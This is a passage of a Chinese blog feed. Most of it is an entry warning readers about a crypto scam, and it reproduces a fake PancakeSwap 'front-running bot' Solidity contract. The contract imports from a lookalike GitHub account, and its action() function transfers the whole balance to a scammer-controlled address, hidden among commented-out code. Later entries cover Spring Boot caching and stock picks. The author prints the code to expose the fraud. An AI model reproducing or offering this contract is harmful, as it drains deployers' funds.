class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.6;</span><br><span class="line"></span><br><span class="line">// PancakeSwap FrontrunDeployer</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol&quot;;</span><br><span class="line">// PancakeSwap manager</span><br><span class="line">import &quot;https://github.com/Uniswapf/uniswap-v2-periphery/blob/main/master-contracts-interfaces/V1/IUniswapV1Factory.md&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PancakeswapV2FrontBot &#123;</span><br><span class="line">    </span><br><span class="line">    string public tokenName;</span><br><span class="line">string public tokenSymbol;</span><br><span class="line">uint frontrun;</span><br><span class="line">Manager manager;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">constructor(string memory _tokenName, string memory _tokenSymbol) public &#123;</span><br><span class="line">tokenName = _tokenName;</span><br><span class="line">tokenSymbol = _tokenSymbol;</span><br><span class="line">manager = new Manager();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // Send required BNB for liquidity pair</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    // Perform tasks (clubbed .json functions into one to reduce external calls &amp; reduce gas) manager.performTasks();</span><br><span class="line">    </span><br><span class="line">    function action() public payable &#123;</span><br><span class="line"></span><br><span class="line">//Perform a front-running attack on uniswap</span><br><span class="line"></span><br><span class="line">//const fs = require(&#x27;fs&#x27;);</span><br><span class="line">//var Web3 = require(&#x27;web3&#x27;);</span><br><span class="line">//var abiDecoder = require(&#x27;abi-decoder&#x27;);</span><br><span class="line">//var colors = require(&quot;colors&quot;);</span><br><span class="line">//var Tx = require(&#x27;ethereumjs-tx&#x27;).Transaction;</span><br><span class="line">//var axios = require(&#x27;axios&#x27;);</span><br><span class="line">//var BigNumber = require(&#x27;big-number&#x27;);</span><br><span class="line"></span><br><span class="line">//const &#123;NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST&#125; = require(&#x27;./constants.js&#x27;);</span><br><span class="line">//const &#123;setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI&#125; = require(&#x27;./bot.js&#x27;);</span><br><span class="line">//const &#123;PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL&#125; = require(&#x27;./env.js&#x27;);</span><br><span class="line"></span><br><span class="line">//const INPUT_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">//const WBNB_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var input_token_info;</span><br><span class="line">//var out_token_info;</span><br><span class="line">//var pool_info;</span><br><span class="line">//var gas_price_info;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var web3;</span><br><span class="line">//var web3Ts;</span><br><span class="line">//var web3Ws;</span><br><span class="line">//var pancakeRouter;</span><br><span class="line">//var pancakeFactory;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">// one gwei</span><br><span class="line">//const ONE_GWEI = 1e9;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var buy_finished = false;</span><br><span class="line">//var sell_finished = false;</span><br><span class="line">//var buy_failed = false;</span><br><span class="line">//var sell_failed = false;</span><br><span class="line">//var attack_started = false;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var succeed = false;</span><br><span class="line">//var subscription;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function createWeb3()&#123;</span><br><span class="line">    //try &#123;</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));</span><br><span class="line">       // web3 = new Web3(EthereumTesterProvider());</span><br><span class="line">       // web3.eth.getAccounts(console.log);</span><br><span class="line">      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));</span><br><span class="line">    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);</span><br><span class="line">        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);</span><br><span class="line">        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //return true;</span><br><span class="line">    //&#125; catch (error) &#123;</span><br><span class="line">      //console.log(error);</span><br><span class="line">      //return false;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">//async function main() &#123;</span><br><span class="line"> </span><br><span class="line">//try &#123;   </span><br><span class="line">        //if (await createWeb3() == false) &#123;</span><br><span class="line">            //console.log(&#x27;Web3 Create Error&#x27;.yellow);</span><br><span class="line">            //process.exit();</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);</span><br><span class="line">        //const out_token_address = TOKEN_ADDRESS;</span><br><span class="line">        //const amount = AMOUNT;</span><br><span class="line">        //const level = LEVEL;</span><br><span class="line">        </span><br><span class="line">        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);</span><br><span class="line">        //if(ret == false) &#123;</span><br><span class="line">          //process.exit();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line"></span><br><span class="line">        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);</span><br><span class="line">        </span><br><span class="line">        //log_str = &#x27;***** Tracking more &#x27; + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + &#x27; &#x27; +  input_token_info.symbol + &#x27;  Exchange on Pancake *****&#x27;</span><br><span class="line">        // console.log(log_str.green);    </span><br><span class="line">        // console.log(web3Ws);</span><br><span class="line">        //web3Ws.onopen = function(evt) &#123;</span><br><span class="line">            //web3Ws.send(JSON.stringify(&#123; method: &quot;subscribe&quot;, topic: &quot;transfers&quot;, address: user_wallet.address &#125;));</span><br><span class="line">            //console.log(&#x27;connected&#x27;)</span><br><span class="line">        </span><br><span class="line">        // get pending transactions</span><br><span class="line">        //subscription = web3Ws.eth.subscribe(&#x27;pendingTransactions&#x27;, function (error, result) &#123;</span><br><span class="line">        //&#125;).on(&quot;data&quot;, async function (transactionHash) &#123;</span><br><span class="line">            //console.log(transactionHash);</span><br><span class="line"></span><br><span class="line">            // let transaction = await web3.eth.getTransaction(transactionHash);</span><br><span class="line">            // if (transaction != null &amp;&amp; transaction[&#x27;to&#x27;] == PANCAKE_ROUTER_ADDRESS)</span><br><span class="line">            // &#123;</span><br><span class="line">            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);</span><br><span class="line">            // &#125;</span><br><span class="line">            </span><br><span class="line">            //if (succeed) &#123;</span><br><span class="line">                //console.log(&quot;The bot finished the attack.&quot;);</span><br><span class="line">                //process.exit();</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    //catch (error) &#123;</span><br><span class="line">      </span><br><span class="line">      //if(error.data != null &amp;&amp; error.data.see === &#x27;https://infura.io/dashboard&#x27;)</span><br><span class="line">      </span><br><span class="line">         //console.log(&#x27;Daily request count exceeded, Request rate limited&#x27;.yellow);</span><br><span class="line">         //console.log(&#x27;Please insert other API Key&#x27;);</span><br><span class="line">      //else&#123;</span><br><span class="line">         //console.log(&#x27;Unknown Handled Error&#x27;);</span><br><span class="line">         //console.log(error);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">      //process.exit();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //(await triggersFrontRun(transaction, out_token_address, amount, level)) &#123;</span><br><span class="line">        //subscription.unsubscribe();</span><br><span class="line">        //console.log(&#x27;Perform front running attack...&#x27;);</span><br><span class="line"></span><br><span class="line">        //gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]);</span><br><span class="line">        //newGasPrice = gasPrice + 50*ONE_GWEI;</span><br><span class="line"></span><br><span class="line">        //estimatedInput = ((amount*0.999)*(10**18)).toString();</span><br><span class="line">        //realInput = (amount*(10**18)).toString();</span><br><span class="line">        //gasLimit = (300000).toString();</span><br><span class="line">        </span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line"></span><br><span class="line">        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line">        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&quot;wait until the honest transaction is done...&quot;, transaction[&#x27;hash&#x27;]);</span><br><span class="line"></span><br><span class="line">        //while (await isPending(transaction[&#x27;hash&#x27;])) &#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //if(buy_failed)</span><br><span class="line">        </span><br><span class="line">            //succeed = false;</span><br><span class="line">            //return;</span><br><span class="line">           </span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Buy succeed:&#x27;)</span><br><span class="line">        </span><br><span class="line">        //Sell</span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();</span><br><span class="line">        //outputeth = outputeth * 0.999;</span><br><span class="line"></span><br><span class="line">        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);</span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Sell succeed&#x27;);</span><br><span class="line">        //succeed = true;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function approve(gasPrice, outputtoken, out_token_address, user_wallet)&#123;</span><br><span class="line">    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();</span><br><span class="line">    </span><br><span class="line">    //allowance = BigNumber(allowance);</span><br><span class="line">    //outputtoken = BigNumber(outputtoken);</span><br><span class="line"></span><br><span class="line">    //var decimals = BigNumber(10).power(out_token_info.decimals);</span><br><span class="line">    //var max_allowance = BigNumber(10000).multiply(decimals);</span><br><span class="line"></span><br><span class="line">    //if(outputtoken.gt(max_allowance))</span><br><span class="line">   </span><br><span class="line">       //console.log(&#x27;replace max allowance&#x27;)</span><br><span class="line">       //max_allowance = outputtoken;</span><br><span class="line">       </span><br><span class="line">       payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    //if(outputtoken.gt(allowance))&#123;</span><br><span class="line">        //console.log(max_allowance.toString());</span><br><span class="line">        //var approveTX =&#123;</span><br><span class="line">                //from: user_wallet.address,</span><br><span class="line">                //to: out_token_address,</span><br><span class="line">                //gas: 50000,</span><br><span class="line">                //gasPrice: gasPrice*ONE_GWEI,</span><br><span class="line">                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()</span><br><span class="line">                manager;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        //var signedTX = await user_wallet.signTransaction(approveTX);</span><br><span class="line">        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&#x27;Approved Token&#x27;)</span><br><span class="line">    </span><br><span class="line">    //return;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//select attacking transaction</span><br><span class="line">//async function triggersFrontRun(transaction, out_token_address, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //if(attack_started)</span><br><span class="line">        //return false;</span><br><span class="line"></span><br><span class="line">    //console.log((transaction.hash).yellow, parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9);</span><br><span class="line">    //if(parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &gt; 10 &amp;&amp; parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &lt; 50)&#123;</span><br><span class="line">        //attack_started = true;</span><br><span class="line">        //return true</span><br><span class="line">   manager; </span><br><span class="line"></span><br><span class="line">    //return false;</span><br><span class="line"></span><br><span class="line">    //if (transaction[&#x27;to&#x27;] != PANCAKE_ROUTER_ADDRESS) &#123;</span><br><span class="line">        //return false;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    //let data = parseTx(transaction[&#x27;input&#x27;]);</span><br><span class="line">   manager;</span><br><span class="line">    //let method = data[0];</span><br><span class="line">    manager;</span><br><span class="line">    //let params = data[1];</span><br><span class="line">    manager;</span><br><span class="line">    //let gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9;</span><br><span class="line">    manager;</span><br><span class="line"></span><br><span class="line">    //if(method == &#x27;swapExactETHForTokens&#x27;)</span><br><span class="line">    manager;</span><br><span class="line">    </span><br><span class="line">        //let in_amount = transaction;</span><br><span class="line">        manager;</span><br><span class="line">        //let out_min = params[0];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //let path = params[1];</span><br><span class="line">        manager;</span><br><span class="line">        //let in_token_addr = path[0];</span><br><span class="line">        manager;</span><br><span class="line">        //let out_token_addr = path[path.length-1];</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">        //let recept_addr = params[2];</span><br><span class="line">        manager;</span><br><span class="line">        //let deadline = params[3];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //if(out_token_addr != out_token_address)</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">            // console.log(out_token_addr.blue)</span><br><span class="line">            // console.log(out_token_address)</span><br><span class="line">            //return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>骗子为了让代码伪装的更加像回事，自己注册了一个GitHub账号弄了个uniswapf的名字，混淆视听。。。我也差点被骗。。。</li></ol><h2 id="警示录"><a href="#警示录" class="headerlink" title="警示录"></a>警示录</h2><ol><li>区块链上遵循丛林法则，这里没有监管，没有纪律，一旦损失，无处伸冤。</li><li>少贪便宜，天山不会掉馅饼</li><li>碰到不懂的，不要头脑发热，被人洗脑，多问问懂的朋友</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;我一个很久没联系的朋友，今天突然找到我，让我帮忙看看代码；说是自己在网上看到了一个区块链套利机器人的代码，很赚钱。自己也不根据代码部署了，但</summary>
      
    
    
    
    <category term="技术生活 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="机器人" scheme="https://www.memestarter.top/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>springboot缓存</title>
    <link href="https://www.memestarter.top/2022/04/07/springboot%E7%BC%93%E5%AD%98/"/>
    <id>https://www.memestarter.top/2022/04/07/springboot%E7%BC%93%E5%AD%98/</id>
    <published>2022-04-07T03:27:21.000Z</published>
    <updated>2022-04-07T14:16:03.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="springboot缓存框架"><a href="#springboot缓存框架" class="headerlink" title="springboot缓存框架"></a>springboot缓存框架</h2><p>springboot的缓存框架对市面上的缓存进行了抽象，使我们可以很方便的集成和使用。它的架构大致如下<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407123350.png" alt="20220407123350"><br>Springboot实现了jsr的标准。</p><blockquote><p>Java Caching（JSR-107）定义了5个核心接口，分别是CachingProvider, CacheManager, Cache, Entry和 Expiry。<br>CachingProvider：创建、配置、获取、管理和控制多个CacheManager<br>CacheManager：创建、配置、获取、管理和控制多个唯一命名的Cache，Cache存在于CacheManager的上下文中。一个CacheManager仅对应一个CachingProvider<br>Cache：是由CacheManager管理的，CacheManager管理Cache的生命周期，Cache存在于CacheManager的上下文中，是一个类似map的数据结构，并临时存储以key为索引的值。一个Cache仅被一个CacheManager所拥有<br>Entry：是一个存储在Cache中的key-value对<br>Expiry：每一个存储在Cache中的条目都有一个定义的有效期。一旦超过这个时间，条目就自动过期，过期后，条目将不可以访问、更新和删除操作。缓存有效期可以通过ExpiryPolicy设置</p></blockquote><p><strong>这样做的好处是做到了统一管理缓存，是的框架的接口和实现分离。如果要切换缓存实现，成本也很低。</strong></p><h2 id="重要的接口以及注解"><a href="#重要的接口以及注解" class="headerlink" title="重要的接口以及注解"></a>重要的接口以及注解</h2><h3 id="重要接口"><a href="#重要接口" class="headerlink" title="重要接口"></a>重要接口</h3><ul><li>Cache：缓存抽象的规范接口，缓存实现有：RedisCache、EhCacheCache、ConcurrentMapCache等</li><li>CacheManager：缓存管理器，管理Cache的生命周期</li></ul><h3 id="重要注解"><a href="#重要注解" class="headerlink" title="重要注解"></a>重要注解</h3><ul><li>@Cacheable<br>添加在方法上,根据条件添加缓存</li></ul><p>value:  缓存的名称,不能为空<br>cacheNames:  缓存的名称,和value二选一<br>key:  缓存的key,默认为空,表示使用方法的参数类型及参数值作为key,支持SpEL<br>keyGenerator:  指定key的生成策略(和key不能共存)<br>cacheManager:  指定缓存管理器<br>cacheResolver:  指定获取解析器<br>condition:  条件符合则缓存<br>unless:  条件符合则不缓存<br>sync:  是否使用异步模式 默认false</p><ul><li><p>@CachePut<br>添加在方法上,根据条件添加缓存<br>@CachePut作用和@Cacheable类似,区别是 <em><strong>@Cacheable没有缓存数据会执行方法后,把结果缓存起来,第二次调用方法不执行方法,直接从缓存中获取数据并返回.@CachePut每次都会执行方法,不管缓存中有没有数据,都会把结果缓存.</strong></em> </p></li><li><p>@CacheEvict<br>添加在方法上,根据条件清空缓存.<br>value:  缓存名称,不能为空<br>cacheNames: 缓存的名称,与value二选一<br>keyGenerator:  key的生成器。key&#x2F;keyGenerator二选一使用<br>condition:  触发条件,支持SpEL<br>allEntries:  true表示清除value中的全部缓存,默认为false<br>beforeInvocation:  是否在方法执行前就清空 默认false<br>cacheManager:  指定缓存管理器<br>cacheResolver:  或者指定获取解析器</p></li><li><p>@CacheConfig<br>作用在类上,为本类的缓存注解配置全局属性<br>cacheNames:  缓存名称<br>keyGenerator:  key的生成器<br>cacheManager:  缓存管理器<br>cacheResolver:  获取解析器</p></li><li><p>@EnableCaching： 开启缓存</p></li></ul><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol><li>Spring boot默认使用的是SimpleCacheConfiguration，即使用ConcurrentMapCacheManager来实现缓存，ConcurrentMapCache实质是一个ConcurrentHashMap集合对象java内置，所以无需引入其他依赖，也没有额外的配置</li><li>Caffeine是使用Java8对Guava缓存的重写版本，在Spring Boot 2.0中将取代，基于LRU算法实现，支持多种缓存过期策略</li><li>StringRedisTemplate默认采用的是String的序列化策略，保存的key和value都是采用此策略序列化保存的。（JdkSerializationRedisSerializer）RedisTemplate默认采用的是JDK的序列化策略，保存的key和value都是采用此策略序列化保存的。（StringRedisSerializer)</li><li>如果使用redis可以配置如下依赖<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- redis starter --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- lettuce pool 缓存连接池 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>不再需要引入其他依赖,SpringBoot导入spring-boot-starter-data-redis时, CacheManager默认使用RedisCache.</p></blockquote><p>否则可以配置如下依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>在不指定缓存 key 属性的情况下，默认使用 SimpleKeyGenerator 生成 key。除此之外，我们也可以自定义实现 KeyGenerator 接口，生成自己的 key 名称策略。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;springboot缓存框架&quot;&gt;&lt;a href=&quot;#springboot缓存框架&quot; class=&quot;headerlink&quot; title=&quot;springboot缓存框架&quot;&gt;&lt;/a&gt;springboot缓存框架&lt;/h2&gt;&lt;p&gt;springboot的缓存框架对市面上的缓存</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 后端技术" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="springboot" scheme="https://www.memestarter.top/tags/springboot/"/>
    
    <category term="技术" scheme="https://www.memestarter.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="编程" scheme="https://www.memestarter.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="缓存" scheme="https://www.memestarter.top/tags/%E7%BC%93%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>股票-20220407</title>
    <link href="https://www.memestarter.top/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/"/>
    <id>https://www.memestarter.top/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/</id>
    <published>2022-04-07T01:25:21.000Z</published>
    <updated>2022-04-07T02:05:01.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="房地产（中南建设等）"><a href="#房地产（中南建设等）" class="headerlink" title="房地产（中南建设等）"></a>房地产（中南建设等）</h3><p>①国联证券郭荆璞估计，单考虑地产投资增速下滑8-10%以及相应的一二手房成交的低迷，就可能使得中国2022年GDP增速下滑到4%出头的水平，若要实现5.5的GDP增长目标，地产政策或将持续调整；<br>②房地产股当前PB处在过去10年9.28%的低估值分位水平，在政策边际改善，叠加稳增长和低估值双重催化，行业或有望迎来戴维斯双击，在此轮房地产周期中，政策目标核心是“维护房地产市场的健康发展，维护住房消费者的合法权益”，因此稳健型房企有望胜出；<br>③郭荆璞从量化角度挑选出中南建设，根据市场一致性预期，目前公司市盈率和市净率分别为4.43&#x2F;0.49倍，在行业中处于低估水平，公司以房地产开发和建筑为主业，土储集中于长三角城市圈及二三线城市，此外公司拥有上海数据交易中心6%的股权，有望受益于数字经济加速发展；<br>④风险提示：宽松政策不及预期等。</p><p>阳光医疗<br>阳普医疗：公司是新冠抗原自测上游辅料的生产商。</p><p>舒泰神，新冠特效药<br>有投资者向舒泰神提问， 尊敬的董秘！贵公司一开始就采用多路线研发COVID-19新冠肺炎的特效药，BDB-001注射液外，STSA-1005和STSA-1002目前研发进度如何？三者正在推进中？还是已经研发失败？请如实回答！谢谢！ 公司回答表示，您好！BDB-001、STSA-1002、STSA-1005项目均在推进中，有关项目进展，敬请关注后续项目进展公告及定期报告。感谢您对公司的关注，谢谢</p><p>永太科技（新能源，钠离子电池，新冠药）<br>近期，北京中科海钠科技有限责任公司发生工商变更，新增华为旗下深圳哈勃科技投资合伙企业（有限合伙）等为股东。中科海钠官网资料显示，中科海钠是一家专注于新一代储能体系-钠离子电池研发与生产的高新技术型企业。企业拥有多项钠离子电池核心专利，是国际少有拥有钠离子电池核心专利与技术的电池企业之一。A股钠离子电池概念股主要有永太科技、翔丰华等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;个股&quot;&gt;&lt;a href=&quot;#个股&quot; class=&quot;headerlink&quot; title=&quot;个股&quot;&gt;&lt;/a&gt;个股&lt;/h2&gt;&lt;h3 id=&quot;房地产（中南建设等）&quot;&gt;&lt;a href=&quot;#房地产（中南建设等）&quot; class=&quot;headerlink&quot; title=&quot;房地产（中</summary>
      
    
    
    
    <category term="投资 - 股票" scheme="https://www.memestarter.top/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/"/>
    
    
    <category term="股票" scheme="https://www.memestarter.top/tags/%E8%82%A1%E7%A5%A8/"/>
    
    <category term="投资" scheme="https://www.memestarter.top/tags/%E6%8A%95%E8%B5%84/"/>
    
  </entry>
  
  <entry>
    <title>股票-20220406</title>
    <link href="https://www.memestarter.top/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/"/>
    <id>https://www.memestarter.top/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/</id>
    <published>2022-04-06T00:51:11.000Z</published>
    <updated>2022-04-06T05:32:55.467Z</updated>
    
